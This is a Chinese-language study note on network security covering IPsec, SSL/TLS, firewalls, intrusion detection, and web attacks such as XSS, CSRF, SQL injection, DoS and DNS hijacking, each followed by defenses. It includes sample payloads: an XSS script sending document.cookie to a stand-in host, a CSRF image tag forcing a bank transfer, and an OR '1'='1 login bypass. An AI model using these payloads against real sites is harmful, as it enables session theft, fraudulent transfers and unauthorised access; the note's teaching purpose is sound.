<h4 id="安全协议"><a href="#安全协议" class="headerlink" title="安全协议"></a>安全协议</h4><h5 id="1-网络层安全协议"><a href="#1-网络层安全协议" class="headerlink" title="1. 网络层安全协议"></a>1. 网络层安全协议</h5><p>IP 安全性很差，因为它没有为通信提供良好的数据源鉴别机制；没有为数据提供强大的完整性保护机制；没有为数据提供任何机密性保护；在设计和实现上存在安全漏洞，使各种攻击有机可乘。例如：攻击者很容易构造一个包含虚假地址的 IP 数据报。</p>
<p>所以 IP 几乎不具备任何安全性，<strong>不能保证</strong>：数据机密性、数据完整性、数据来源认证。由于其在设计和实现上存在安全漏洞，使各种攻击有机可乘。例如：攻击者很容易构造一个包含虚假地址的 IP 数据报。<strong>IPsec</strong> 提供了标准、健壮且包含广泛的机制保证 IP 层安全。</p>
<h6 id="1-Psec协议族概述"><a href="#1-Psec协议族概述" class="headerlink" title="(1) Psec协议族概述"></a>(1) Psec协议族概述</h6><p>IPsec 就是<strong>“IP 安全 (security)”</strong>的缩写。IPsec 并不是一个单个的协议，而是能够在 IP 层提供互联网通信安全的<strong>协议族</strong>。IPsec 是个<strong>框架</strong>，它允许通信双方选择合适的算法和参数（例如，密钥长度）。为保证互操作性，IPsec 还包含了所有 IPsec 的实现都必须有的一套<strong>加密算法</strong>。</p>
<p><strong>组成</strong>：</p>
<ul>
<li><strong>IP 安全数据报格式</strong>的两个协议：鉴别首部 AH (Authentication Header) 协议、<strong>封装安全有效载荷 ESP</strong> (Encapsulation Security Payload) 协议。</li>
<li><strong>有关加密算法</strong>的三个协议（在此不讨论）</li>
<li><strong>互联网密钥交换 IKE</strong> (Internet Key Exchange) 协议</li>
</ul>
<p>AH 协议提供源点鉴别和数据完整性，但不能保密。ESP 协议比 AH 协议复杂得多，它提供源点鉴别、数据完整性和保密。<strong>使用 ESP 或 AH 协议的 IP 数据报称为 ==IP 安全数据报==（或 ==IPsec数据报==）</strong>。Ipsec 支持 IPv4 和 IPv6。AH 协议的功能都已包含在 ESP 协议中。</p>
<h6 id="2-IP安全数据报的工作方式"><a href="#2-IP安全数据报的工作方式" class="headerlink" title="(2) IP安全数据报的工作方式"></a>(2) IP安全数据报的工作方式</h6><p><strong>运输方式</strong>：<strong>==整个运输层报文段==</strong>的前后分别添加若干<strong>控制信息</strong>，再加上 IP 首部，<strong>构成 IP 安全数据报</strong>。适合于主机到主机之间的安全传送。 需要使用 IPsec 的主机都运行 IPsec 协议。</p>
<img src="assets/1574756070267.png" alt="1574756070267" style="zoom:60%;" />

<p><strong>隧道方式</strong>：在<strong>==原始的 IP 数据报==</strong>的前后分别添加若干<strong>控制信息</strong>，再加上新的 IP 首部，构成一个 IP 安全数据报。需要在 IPsec 数据报所经过的所有路由器上都运行 <strong>IPsec 协议</strong>。隧道方式常用来<strong>实现虚拟专用网 VPN</strong> 的加密。</p>
<img src="assets/1574756133969.png" alt="1574756133969" style="zoom:60%;" />

<p>无论使用哪种方式，最后得出的 IP 安全数据报的 <strong>IP 首部都是不加密</strong>的。所谓“安全数据报”是指数据报的<strong>数据部分是经过加密</strong>的，并能够被鉴别的。通常把数据报的数据部分称为数据报的有效载荷 (payload)。</p>
<h6 id="3-安全关联"><a href="#3-安全关联" class="headerlink" title="(3) 安全关联"></a>(3) 安全关联</h6><p>在发送 IP 安全数据报之前，在源实体和目的实体之间必须创建一条<strong>网络层的逻辑连接</strong>。此逻辑连接叫做<strong>安全关联</strong> SA (Security Association) 。<strong>IPsec</strong> 就把传统互联网无连接的网络层<strong>转换为具有逻辑连接的网络层</strong>。 </p>
<p>安全关联是从源点到终点的<strong>单向连接</strong>，它能够提供安全服务。在安全关联 SA 上传送的就是 <strong>IP 安全数据报</strong>。<br>如要进行双向安全通信，则两个方向都需要建立安全关联。若 n 个员工进行双向安全通信，一共需要创建 (2 + 2n ) 条安全关联 SA。</p>
<h6 id="4-IP-安全数据报的格式"><a href="#4-IP-安全数据报的格式" class="headerlink" title="(4) IP 安全数据报的格式"></a>(4) IP 安全数据报的格式</h6><p><strong>隧道</strong>方式下的 IP 安全数据报的格式。</p>
<img src="assets/1574756486826.png" alt="1574756486826" style="zoom:60%;" />

<h5 id="2-运输层安全协议"><a href="#2-运输层安全协议" class="headerlink" title="2. 运输层安全协议"></a>2. 运输层安全协议</h5><h6 id="1-概述-3"><a href="#1-概述-3" class="headerlink" title="(1) 概述"></a>(1) 概述</h6><p>现在广泛使用的有以下两个协议： </p>
<ul>
<li><strong>安全套接字层协议 SSL</strong> (Secure Socket Layer) </li>
<li><strong>运输层安全 TLS 协议</strong> (Transport Layer Security)  </li>
</ul>
<p>安全套接层 SSL 由 Netscape 于 1994 年开发，广泛应用于基于万维网的各种网络应用（但不限于万维网应用）。<br>SSL 作用在端系统应用层的 <strong>HTTP 和运输层</strong>之间，在 <strong>TCP 之上建立起一个==安全通道==</strong>，为通过 <strong>TCP 传输的应用层</strong>数据提供安全保障。1999 年，IETF 在 <strong>SSL</strong> 3.0 <strong>基础</strong>上推出了<strong>传输层安全标准 TLS</strong>，为<strong>所有基于 TCP 的网络应用</strong>提供安全数据传输服务。</p>
<img src="assets/1574756662496.png" alt="1574756662496" style="zoom:45%;" />

<p>在<strong>发送方</strong>，<strong>SSL</strong> 接收<strong>应用层</strong>的数据，对数据进行<strong>加密</strong>，然后把<strong>加了密</strong>的数据送往 <strong>TCP 套接字</strong>。在<strong>接收方</strong>，<strong>SSL</strong> 从 <strong>TCP</strong> 套接字<strong>读取</strong>数据，<strong>解密</strong>后把数据交给应用层。 </p>
<p>运输层不使用安全协议和<strong>使用安全协议</strong>的对比如下图所示。</p>
<img src="assets/1574756741778.png" alt="1574756741778" style="zoom:52%;" />

<p>SSL / TLS 建立在<strong>可靠的 TCP</strong> 之上，与<strong>应用层协议独立无关</strong>。</p>
<p><strong>应用层</strong>使用 SSL 最多的就是 <strong>HTTP</strong>，但 SSL <strong>并非仅用于 HTTP</strong>，而是可用于<strong>任何应用层</strong>的协议。应用程序 HTTP 调用 <strong>SSL 对整个网页</strong>进行加密时，网页上会提示用户，在网址栏原来显示 HTTP 的地方，现在变成了 <strong>https</strong>。在 HTTP 后面加上的 s 代表 <strong>security</strong>，表明现在使用的是提供安全服务的 HTTP 协议（TCP 的 HTTPS 端口号是 <strong>443</strong>，而不是平时使用的端口号 80）。</p>
<p><strong>SSL 提供的安全服务</strong>：</p>
<ul>
<li><strong>SSL 服务器鉴别</strong>，允许用户证实服务器的身份。支持 SSL 的客户端 通过验证来自服务器的证书，来鉴别服务器的真实身份并获得服务器的公钥。</li>
<li><strong>SSL 客户鉴别</strong>，SSL 的可选安全服务，允许服务器证实客户的身份。</li>
<li><strong>加密的 SSL 会话</strong>，对客户和服务器间发送的所有报文进行加密，并检测报文<strong>是否被篡改</strong>。</li>
</ul>
<h6 id="2-SSL安全会话建立过程"><a href="#2-SSL安全会话建立过程" class="headerlink" title="(2) SSL安全会话建立过程"></a><strong>(2) SSL安全会话建立过程</strong></h6><img src="assets/1574756922976.png" alt="1574756922976" style="zoom:55%;" />

<ol>
<li><strong>协商加密算法</strong>。 ① 浏览器 A 向服务器 B 发送浏览器的 SSL 版本号和一些可选的加密算法。 ② B 从中选定自己所支持的算法（如 RSA），并告知 A。</li>
<li><strong>服务器鉴别</strong>。 ③ 服务器 B 向浏览器 A 发送包含<strong>其 RSA 公钥</strong>的<strong>数字证书</strong>。 ④ A 使用该证书的<strong>认证机构 CA 公开发布的 RSA 公钥对该证书进行验证</strong>。</li>
<li><strong>会话密钥计算</strong>。由浏览器 A 随机产生一个<strong>秘密数</strong>。 ⑤ 用服务器 B 的 <strong>RSA 公钥</strong>进行加密后发送给 B。 ⑥ 双方根据协商的算法产生<strong>共享的对称会话密钥</strong>。</li>
<li><strong>安全数据传输</strong>。 ⑦ 双方用会话密钥加密和解密它们之间传送的数据并验证其完整性。</li>
</ol>
<h5 id="3-应用层安全协议"><a href="#3-应用层安全协议" class="headerlink" title="3. 应用层安全协议"></a>3. 应用层安全协议</h5><p>本节仅讨论应用层中有关<strong>电子邮件</strong>的安全协议。发送电子邮件是个即时的行为。发送方 A 和接收方 B 并不会为此而建立任何会话。电子邮件安全协议就应当为每种加密操作定义相应的算法，以及密钥管理、鉴别、完整性保护等方法。</p>
<h4 id="防火墙与入侵检测"><a href="#防火墙与入侵检测" class="headerlink" title="防火墙与入侵检测"></a>防火墙与入侵检测</h4><h5 id="1-防火墙"><a href="#1-防火墙" class="headerlink" title="1. 防火墙"></a>1. 防火墙</h5><p>防火墙是由软件、硬件构成的系统，是一种特殊编程的<strong>路由器</strong>，用来在两个网络之间实施访问控制策略。<br>访问控制策略是由使用防火墙的单位自行制订的，为的是可以最适合本单位的需要。防火墙内的网络称为“可信的网络”(trusted network)，而将外部的互联网称为“不可信的网络”(untrusted network)。防火墙可用来解决<strong>内联网和外联网</strong>的安全问题。</p>
<img src="assets/1574767301364.png" alt="1574767301364" style="zoom:50%;" />

<p>防火墙的功能有两个：<strong>阻止和允许</strong>。</p>
<ul>
<li>“阻止”就是阻止某种类型的通信量通过防火墙（从外部网络到内部网络，或反过来）。</li>
<li>“允许”的功能与“阻止”恰好相反。</li>
</ul>
<p>防火墙必须能够识别各种类型的通信量。不过在大多数情况下防火墙的主要功能是“阻止”。</p>
<p>防火墙技术分为一般两类：</p>
<p><strong>分组过滤路由器</strong></p>
<ul>
<li>是一种具有分组过滤功能的路由器，它根据过滤规则对进出内部网络的分组执行转发或者丢弃（即过滤）。过滤规则基于分组的网络层或运输层首部的信息，例如：源/目的 IP 地址、源/目的端口、协议类型（TCP 或 UDP）等。</li>
<li>分组过滤可以是无状态的，即独立地处理每一个分组。也可以是有状态的，即要跟踪每个连接或会话的通信状态，并根据这些状态信息来决定是否转发分组。</li>
<li>简单高效，对用户透明，但不能对高层数据进行过滤。</li>
</ul>
<p><strong>应用网关也称为代理服务器 (proxy server)</strong></p>
<ul>
<li>它在应用层通信中扮演报文中继的角色。</li>
<li>每种网络应用需要一个应用网关。</li>
<li>在应用网关中，可以实现基于应用层数据的过滤和高层用户鉴别。</li>
<li>所有进出网络的应用程序报文都必须通过应用网关。</li>
<li>应用网关也有一些缺点：每种应用都需要一个不同的应用网关；在应用层转发和处理报文，处理负担较重；对应用程序不透明，需要在应用程序客户端配置应用网关地址。</li>
</ul>
<h5 id="2-入侵检测"><a href="#2-入侵检测" class="headerlink" title="2. 入侵检测"></a>2. 入侵检测</h5><p>防火墙试图在入侵行为发生之前阻止所有可疑的通信。<strong>入侵检测系统 IDS</strong> (Intrusion Detection System) 能够在入侵已经开始，但还没有造成危害或在造成更大危害前，及时检测到入侵，以便尽快阻止入侵，把危害降低到最小。 </p>
<p>IDS 对进入网络的分组执行深度分组检查，当观察到可疑分组时，向网络管理员发出告警或执行阻断操作（由于 IDS 的“误报”率通常较高，多数情况不执行自动阻断）。<br>IDS 能用于<strong>检测多种网络攻击</strong>，包括网络映射、端口扫描、DoS 攻击、蠕虫和病毒、系统漏洞攻击等。</p>
<h4 id="Web攻击技术"><a href="#Web攻击技术" class="headerlink" title="Web攻击技术"></a>Web攻击技术</h4><p>总结一下常见的 Web 攻击方法。</p>
<ul>
<li><strong>XSS 攻击</strong>（关键是脚本，利用恶意脚本发起攻击）</li>
<li><strong>CSRF 攻击</strong>（关键是借助本地 cookie 进行认证，伪造发送请求）</li>
<li><strong>SQL 注入</strong>（关键是通过用 SQL 语句伪造参数发出攻击）</li>
<li><strong>DDOS 攻击</strong>（关键是发出大量请求，最后令服务器崩溃）</li>
</ul>
<h5 id="1-跨站脚本攻击XSS"><a href="#1-跨站脚本攻击XSS" class="headerlink" title="1. 跨站脚本攻击XSS"></a>1. 跨站脚本攻击XSS</h5><h6 id="1-概念"><a href="#1-概念" class="headerlink" title="(1) 概念"></a>(1) 概念</h6><p>跨站脚本攻击（Cross-Site Scripting, XSS）<strong>指黑客向正常用户请求的 HTML 页面中插入恶意脚本，从而可以执行任意脚本</strong>。XSS 可以将<strong>代码</strong>注入到<strong>用户浏览的网页</strong>上，这种代码包括 <strong>HTML</strong> 和 <strong>JS</strong> 代码，从而达到攻击的目的，如盗取用户的 <strong>cookie</strong>，改变网页的 DOM 结构，重定向到其他网页等。</p>
<p>主要分为：反射型 XSS、存储型 XSS、DOM 型 XSS。</p>
<p><strong>危害</strong>：窃取用户的 Cookie、伪造虚假的输入表单骗取个人信息、显示伪造的文章或者图片等。</p>
<h6 id="2-攻击原理"><a href="#2-攻击原理" class="headerlink" title="(2) 攻击原理"></a>(2) 攻击原理</h6><p>例如有一个<strong>论坛网站</strong>，攻击者可以在上面发布以下内容：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">location.href=<span class="string">"//domain.com/?c="</span> + <span class="built_in">document</span>.cookie</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>被攻击之后该内容可能会被<strong>渲染</strong>成以下形式：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">location.href=<span class="string">"//domain.com/?c="</span> + <span class="built_in">document</span>.cookie</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>另一个用户浏览了含有这个内容的页面将会跳转到 domain.com 并携带了<strong>当前作用域的 Cookie</strong>。如果这个论坛网站通过 Cookie 管理用户登录状态，那么攻击者就可以通过这个 Cookie 登录被攻击者的账号了。</p>
<h6 id="3-攻击分类举例"><a href="#3-攻击分类举例" class="headerlink" title="(3) 攻击分类举例"></a>(3) 攻击分类举例</h6><p><strong>① 反射型XSS</strong></p>
<p>又称为非持久性跨站点脚本攻击，它是最常见的类型的 XSS。漏洞产生的原因是攻击者注入的数据反映在响应中。一个典型的非持久性 XSS 包含一个带 XSS 攻击向量的链接(即每次攻击需要用户的点击)。</p>
<p><strong>简单例子</strong>：正常发送消息：<code>http://www.test.com/message.php?send=Hello,World！</code>，接收者将会接收信息并显示 Hello,Word。</p>
<p>非正常发送消息：<code>http://www.test.com/message.php?send=&lt;script&gt;alert(‘foolish!’)&lt;/script&gt;！</code>，接收者接收消息显示的时候将会弹出警告窗口。</p>
<p><strong>② 持久型XSS</strong></p>
<p>又称为持久型跨站点脚本，它一般发生在 XSS 攻击向量(一般指 XSS 攻击代码)存储在网站数据库，当一个页面被用户打开的时候执行。每当用户打开浏览器脚本执行。持久的 XSS 相比非持久性 XSS 攻击危害性更大,因为每当用户打开页面，查看内容时脚本将自动执行。谷歌的 orkut 曾经就遭受到 XSS。</p>
<p><strong>简单例子：</strong></p>
<p>从名字就可了解到存储型 XSS 攻击就是将攻击代码存入数据库中，然后客户端打开时就执行这些攻击代码。例如留言板</p>
<p>留言板表单中的表单域：<code>&lt;input type=“text” name=“content” value=“这里是用户填写的数据”&gt;</code></p>
<p><strong>正常操作：</strong>用户是提交相应留言信息；将数据存储到数据库；其他用户访问留言板，应用去数据并显示。</p>
<p><strong>非正常操作：</strong>攻击者在value填写<code>&lt;script&gt;alert(‘foolish!’)&lt;/script&gt;</code>【或者html其他标签（破坏样式。。。）、一段攻击型代码】；将数据存储到数据库中；其他用户取出数据显示的时候，将会执行这些攻击性代码</p>
<p><strong>③ DOM-based XSS</strong></p>
<p>基于 DOM 的 XSS，通过对具体 DOM 代码进行分析，根据实际情况<strong>构造 dom 节点</strong>进行 XSS 跨站脚本攻击。</p>
<h6 id="4-防范手段"><a href="#4-防范手段" class="headerlink" title="(4) 防范手段"></a>(4) 防范手段</h6><p>记住一句至理名言：“<strong>所有用户输入都是不可信的</strong>。”防范方式很简单，<strong>坚决不要相信用户的任何输入</strong>，并<strong>过滤</strong>掉输入中的所有特殊字符。这样就能消灭绝大部分的 XSS 攻击。</p>
<p><strong>I 设置 Cookie 为 HttpOnly</strong></p>
<p>设置了 HttpOnly 的 Cookie 可以<strong>防止 JavaScript 脚本</strong>调用，就无法通过 document.cookie 获取用户 Cookie 信息。</p>
<p><strong>II 过滤或转义用户输入数据</strong></p>
<p>例如将 <code>&lt;</code> 转义为 <code>&amp;lt;</code>，将 <code>&gt;</code> 转义为 <code>&amp;gt;</code>，从而避免 HTML 和 Jascript 代码的运行。</p>
<p>可以使用 Jsoup 框架对用户输入字符串做 <strong>XSS 过滤</strong>。</p>
<h5 id="2-跨站请求伪造CSRF"><a href="#2-跨站请求伪造CSRF" class="headerlink" title="2. 跨站请求伪造CSRF"></a>2. 跨站请求伪造CSRF</h5><h6 id="1-概念-1"><a href="#1-概念-1" class="headerlink" title="(1) 概念"></a>(1) 概念</h6><p>跨站请求伪造（Cross-site request forgery，CSRF），是攻击者通过一些技术手段欺骗用户的浏览器去<strong>访问一个自己曾经认证过的网站</strong>并执行一些操作（如发邮件，发消息，甚至财产操作如转账和购买商品）。由于浏览器<strong>曾经认证</strong>过，所以被访问的网站会认为是<strong>真正</strong>的用户操作而去执行。</p>
<p>大致流程：用户登录并浏览正常网站，正常网站服务器响应并且返回标识该用户身份的 <strong>cookie</strong>，此时用户未注销正常网站的情况下，访问恶意网站。此时恶意网站去访问正常网站并且带着标识用户的 cookie，正常网站服务器就会接受来自恶意网站的请求。这些欺骗的访问方式有很多，例如“点击小广告、找回密码”等等诱导用户去点击操作。</p>
<h6 id="2-攻击原理-1"><a href="#2-攻击原理-1" class="headerlink" title="(2) 攻击原理"></a>(2) 攻击原理</h6><p>假如一家银行用以<strong>执行转账</strong>操作的 URL 地址如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.examplebank.com/withdraw?account=AccoutName&amp;amount=1000&amp;for=PayeeName。</span><br></pre></td></tr></table></figure>

<p>比如一个用户<strong>登录</strong>了银行的网站（已经有了 cookie），在这个网站的评论区中有人发了一个学习炒股的超链接，这个人点了之后，这个链接可能执行：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;http://www.examplebank.com/withdraw?account=Alice&amp;amount=1000&amp;for=Badman&quot;&gt;。</span><br></pre></td></tr></table></figure>

<p>这就可能造成用户损失 1000 美元。</p>
<p>这种<strong>恶意的网址</strong>可以有很多种形式，藏身于网页中的许多地方。此外攻击者也不需要控制放置恶意网址的网站。例如他可以将这种地址藏在论坛，博客等任何用户生成内容的网站中。这意味着如果服务器端没有合适的防御措施的话，用户即使访问熟悉的可信网站也有受攻击的危险。</p>
<p>通过例子能够看出，攻击者并<strong>不能通过 CSRF 攻击来直接获取用户的账户控制权</strong>，也不能直接窃取用户的任何信息。他们能做到的就是欺骗用户浏览器，让其以用户的名义执行操作。</p>
<p>总结一下 CSRF 攻击流程：用户登录受<strong>信任网站A</strong>，并在本地<strong>生成 Cookie</strong>。用户在<strong>不登出A</strong>的情况下访问<strong>危险网站 B</strong>，这时候恶意网站就会<strong>利用 cookie</strong> 去发起恶意请求。</p>
<h6 id="3-防范手段"><a href="#3-防范手段" class="headerlink" title="(3) 防范手段"></a>(3) 防范手段</h6><p><strong>I 使用 Token 验证</strong></p>
<p>在访问敏感数据请求时，要求用户浏览器提供<strong>不保存在 Cookie</strong> 中，并且攻击者无法伪造的数据作为校验。例如服务器生成随机数并附加在表单中，并要求客户端传回这个随机数。所以可以<strong>采用 token（不存储于浏览器）认证</strong>。</p>
<p><strong>II 人机交互</strong></p>
<p>配合验证码进行验证。因为 CSRF 攻击是在用户无意识的情况下发生的，所以要求用户<strong>输入验证码</strong>可以让用户知道自己正在做的操作，所以银行转账这些一般都会有短信验证码。</p>
<p><strong>III 检查 Referer 首部字段</strong></p>
<p><strong>Referer 首部字段</strong>位于 HTTP 报文中，用于<strong>标识请求来源</strong>的地址。检查这个<strong>首部字段</strong>并要求<strong>请求来源</strong>的地址在<strong>同一个域名</strong>下，可以极大的防止 CSRF 攻击。Referer 指的是页面请求来源。意思是，只接受本站的请求，服务器才做响应；如果不是，就拦截。</p>
<p>这种办法简单易行，工作量低，仅需要在关键访问处增加一步校验。但这种办法也有其局限性，因其完全依赖浏览器发送正确的 Referer 字段。虽然 HTTP 协议对此字段的内容有明确的规定，但并无法保证来访的浏览器的具体实现，亦无法保证浏览器没有安全漏洞影响到此字段。并且也存在攻击者攻击某些浏览器，篡改其 Referer 字段的可能。</p>
<h6 id="4-XSS与CSRF区别"><a href="#4-XSS与CSRF区别" class="headerlink" title="(4) XSS与CSRF区别"></a>(4) XSS与CSRF区别</h6><p><strong>XSS 是在正常用户请求的 HTML 页面中执行黑客植入的恶意代码，CSRF 是黑客直接盗用用户浏览器中的登录信息，冒充用户去执行黑客的操作。</strong></p>
<p><strong>XSS 的问题出在用户数据没有过滤或者转义；CSRF 的问题出在 HTTP 接口没有防范不受信任的调用。</strong></p>
<h5 id="3-SQL注入攻击"><a href="#3-SQL注入攻击" class="headerlink" title="3. SQL注入攻击"></a>3. SQL注入攻击</h5><h6 id="1-概念-2"><a href="#1-概念-2" class="headerlink" title="(1) 概念"></a>(1) 概念</h6><p><strong>SQL 注入攻击是未将代码与数据进行严格的隔离，导致在读取用户数据的时候，错误的把数据作为代码的一部分执行，从而导致安全性问题。</strong></p>
<h6 id="2-攻击原理-2"><a href="#2-攻击原理-2" class="headerlink" title="(2) 攻击原理"></a>(2) 攻击原理</h6><p>例如一个网站登录验证的 SQL 查询代码为：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strSQL = "<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> (<span class="keyword">name</span> = <span class="string">'" + userName + "'</span>) <span class="keyword">and</span> (pw = <span class="string">'"+ passWord +"'</span>);"</span><br></pre></td></tr></table></figure>

<p>如果填入以下内容：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">userName = "1' OR '1'='1";</span><br><span class="line">passWord = "1' OR '1'='1";</span><br></pre></td></tr></table></figure>

<p>那么 SQL 查询字符串为：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strSQL = "<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> (<span class="keyword">name</span> = <span class="string">'1'</span> <span class="keyword">OR</span> <span class="string">'1'</span>=<span class="string">'1'</span>) <span class="keyword">and</span> (pw = <span class="string">'1'</span> <span class="keyword">OR</span> <span class="string">'1'</span>=<span class="string">'1'</span>);"</span><br></pre></td></tr></table></figure>

<p>此时无需验证通过就能执行以下查询：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strSQL = "<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span>;"</span><br></pre></td></tr></table></figure>

<h6 id="3-防范手段-1"><a href="#3-防范手段-1" class="headerlink" title="(3) 防范手段"></a>(3) 防范手段</h6><p><strong>I 合理使用框架，使用预编译语句</strong></p>
<p>Java 中的 <strong>PreparedStatement</strong> 是<strong>预先编译</strong>的 SQL 语句，可以传入适当参数并且多次执行。由于没有拼接的过程，因此可以防止 SQL 注入的发生。MyBatis 中也有类似机制。绑定变量使用预编译语句是预防 SQL 注入的最佳方式，使用预编译的 SQL 语句语义不会发生改变。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PreparedStatement stmt = connection.prepareStatement(<span class="string">"SELECT * FROM users WHERE userid=? AND password=?"</span>);</span><br><span class="line">stmt.setString(<span class="number">1</span>, userid);</span><br><span class="line">stmt.setString(<span class="number">2</span>, password);</span><br><span class="line">ResultSet rs = stmt.executeQuery();</span><br></pre></td></tr></table></figure>

<p>MyBatis 框架的 <strong>#{} 绑定参数</strong>也能防止 SQL 注入。</p>
<p><strong>II 输入过滤</strong></p>
<p>过滤用户输入参数中的特殊字符。</p>
<h5 id="4-拒绝服务攻击DOS"><a href="#4-拒绝服务攻击DOS" class="headerlink" title="4. 拒绝服务攻击DOS"></a>4. 拒绝服务攻击DOS</h5><h6 id="1-概念-3"><a href="#1-概念-3" class="headerlink" title="(1) 概念"></a>(1) 概念</h6><p>拒绝服务攻击（denial-of-service attack，DoS），亦称洪水攻击，其目的在于使目标电脑的网络或系统资源耗尽，使服务暂时中断或停止，导致其正常用户无法访问。</p>
<p>分布式拒绝服务攻击（distributed denial-of-service attack，DDoS），指攻击者使用两个或以上被攻陷的电脑作为“僵尸”向特定的目标发动“拒绝服务”式攻击。</p>
<h6 id="2-攻击方法"><a href="#2-攻击方法" class="headerlink" title="(2) 攻击方法"></a>(2) 攻击方法</h6><p>典型的 DOS 攻击方式如下：</p>
<ul>
<li><strong>SYN Flood</strong> ： 这是一种利用 <strong>TCP 协议</strong>缺陷，发送大量伪造的 <strong>TCP 连接请求</strong>，从而使得被攻击方资源耗尽（CPU满负荷或内存不足）的攻击方式。TCP 三次握手时，客户端服务器发出请求，请求建立连接，然后服务器返回一个报文，表明请求以被接受，然后客户端也会返回一个报文，最后建立连接。那么如果有这么一种情况，攻击者伪造 IP 地址，发出报文给服务器请求连接，这个时候服务器接受到了，根据 TCP 三次握手的规则，服务器也要回应一个报文，可是这个 <strong>IP 是伪造的</strong>，报文回应给谁呢，<strong>第二次握手出现错误</strong>，第三次自然也就不能顺利进行了，这个时候服务器收不到第三次握手时客户端发出的报文，又再<strong>重复第二次握手</strong>的操作。如果攻击者伪造了大量的 IP 地址并发出请求，这个时候服务器将维护一个非常大的<strong>半连接</strong>等待列表，占用了大量的资源，最后服务器瘫痪。</li>
<li><strong>CC 攻击</strong>：CC 攻击是目前应用层攻击的主要手段之一，借助代理服务器生成指向目标系统的合法请求，实现伪装和 DDoS。CC 攻击就模拟多个正常用户不停地访问如论坛这些需要大量数据操作的页面，造成服务器资源的浪费，CPU 长时间处于100%，永远都有处理不完的请求，网络拥塞，正常访问被中止。这种攻击技术性含量高，见不到真实源 IP，见不到特别大的异常流量，但服务器就是无法进行正常连接。</li>
</ul>
<h6 id="3-预防"><a href="#3-预防" class="headerlink" title="(3) 预防"></a>(3) 预防</h6><p>没有根治的办法，除非不用 TCP/IP 链接。</p>
<ul>
<li>确保服务器的系统文件是最新版本，并及时更新系统补丁。</li>
<li>正确设置防火墙。关闭不必要的服务，禁止对主机的非开放服务的访问，运行端口映射程序祸端口扫描程序，要认真检查特权端口和非特权端口，启用防火墙的防 DDos 的属性。 </li>
<li>限制同时打开 <strong>SYN 的半连接</strong>数目，缩短 SYN 半连接的 time out 时间。</li>
<li>限制特定 IP 短地址的访问。</li>
<li>认真检查网络设备和主机/服务器系统的日志。只要日志出现漏洞或是时间变更，那这台机器就可能遭到了攻击。 </li>
<li>限制在防火墙外与网络文件共享。这样会给黑客截取系统文件的机会，主机的信息暴露给黑客，无疑是给了对方入侵的机会。 </li>
</ul>
<p>阿里巴巴的安全团队在实战中发现，DDoS 防御产品的核心是<strong>检测技术和清洗技术</strong>。检测技术就是检测网站是否正在遭受 DDoS 攻击，而清洗技术就是清洗掉异常流量。</p>
<h5 id="5-DNS劫持"><a href="#5-DNS劫持" class="headerlink" title="5. DNS劫持"></a>5. DNS劫持</h5><h6 id="1-概述-4"><a href="#1-概述-4" class="headerlink" title="(1) 概述"></a>(1) 概述</h6><p>DNS 劫持攻击亦称为 DNS 重定向是一种网络攻击，攻击者劫持用户的 DNS 请求，错误地解析网站的 IP 地址，用户试图加载，从而将其重定向到网络钓鱼站点。</p>
<p>要执行 DNS 劫持攻击，攻击者要么在用户的系统上安装恶意软件，要么通过利用已知漏洞或破解 DNS 通信来接管路由器。</p>
<p>攻击涉及破坏用户的系统DNS（TCP / IP）设置，以将其重定向到“Rogue DNS”服务器，从而使默认 DNS 设置无效。要执行攻击，攻击者要么在用户的系统上安装恶意软件，要么通过利用已知漏洞或破解 DNS 通信来接管路由器。因此，用户将成为域欺骗或网络钓鱼的受害者。</p>
<h6 id="2-分类"><a href="#2-分类" class="headerlink" title="(2) 分类"></a>(2) 分类</h6><p>● <strong>本地DNS劫持攻击</strong>：在本地 DNS 劫持中，攻击者在用户系统上植入恶意软件并修改本地 DNS 设置，因此用户的系统现在使用由攻击者控制的 DNS 服务器。攻击者控制的 DNS 服务器将网站域请求转换为恶意站点的 IP 地址，从而将用户重定向到恶意站点。</p>
<p>● <strong>路由器DNS劫持攻击</strong>：在此类攻击中，攻击者利用路由器中存在的固件漏洞来覆盖 DNS 设置，从而影响连接到该路由器的所有用户。攻击者还可以通过利用路由器的默认密码来接管路由器。</p>
<p>● <strong>中间人（MiTM）DNS攻击</strong>：在这种类型的 DNS 劫持中，攻击者执行中间人（MiTM）攻击以拦截用户和 DNS 服务器之间的通信并提供不同的目标 IP 地址，从而将用户重定向到恶意站点。</p>
<h6 id="3-防止DNS劫持攻击"><a href="#3-防止DNS劫持攻击" class="headerlink" title="(3) 防止DNS劫持攻击"></a>(3) 防止DNS劫持攻击</h6><p>● 为防止 DNS 劫持，始终建议使用良好的安全软件和防病毒程序，并确保定期更新软件。 安全专家建议使用公共 DNS 服务器，最好定期检查 DNS 设置是否已修改，并确保 DNS 服务器是安全的。</p>
